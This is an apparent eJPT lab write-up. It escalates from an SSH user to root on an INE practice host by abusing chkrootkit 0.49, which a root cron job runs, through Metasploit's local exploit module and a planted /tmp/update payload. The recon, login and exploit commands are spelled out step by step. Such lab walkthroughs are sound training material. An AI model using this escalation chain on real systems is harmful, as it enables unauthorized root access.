# Privilege Escalation via Rootkit Scanner (chkrootkit 0.49) - INE eJPT

INE privilege escalation lab exploiting a known vulnerability in chkrootkit 0.49. The scanner is executed every 60 seconds by a root cron job. Metasploit's local exploit module abuses the vulnerability to escalate from `jackie` (SSH) to root.

Target: `demo.ine.local` (Linux)

---

## Reconnaissance

```bash
ping -c 4 demo.ine.local
nmap -sS -sV demo.ine.local
```

Port 22 open - SSH.

---

## Initial Access

Credentials `jackie:password` provided by the lab.

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERNAME jackie
set PASSWORD password
exploit
sessions -i 1
```

---

## Enumeration

```bash
ps aux
```

Suspicious script identified: `/bin/check-down`

```bash
cat /bin/check-down
```

The script runs `chkrootkit` every 60 seconds as root.

### Version Check

```bash
command -v chkrootkit
chkrootkit -V
```

```
chkrootkit 0.49
```

Version 0.49 is vulnerable to a local privilege escalation exploit.

```bash
searchsploit chkrootkit 0.49
```

Metasploit module available: `exploit/unix/local/chkrootkit`

---

## Exploitation

```bash
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION 1
set LHOST <attacker_ip>
exploit
```

The exploit abuses how chkrootkit processes files in `/tmp` when run as root. When the cron job triggers the next chkrootkit execution, the payload executes in the root context.

```bash
cat /root/flag
```

```
9db8bf8f483ff50857f26f9bd636bed6
```

---

## Key Takeaways

- Security tools themselves can be privilege escalation vectors when left at vulnerable versions. chkrootkit 0.49 abuses how the scanner handles `/tmp/update` - a file in a world-writable directory processed with root privileges.
- Cron job enumeration (`ps aux` to spot automated scripts, then `cat` the script to read its content) is the correct approach when initial enumeration reveals no obvious SUID or sudo misconfigurations.
- The combination of a vulnerable tool plus a root-owned cron job equals a privilege escalation even when no kernel exploit is needed or available.
- Version checking installed tools (`tool -V` or `tool --version`) is a mandatory step during local enumeration. Every system binary and installed utility is a potential exploit surface.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
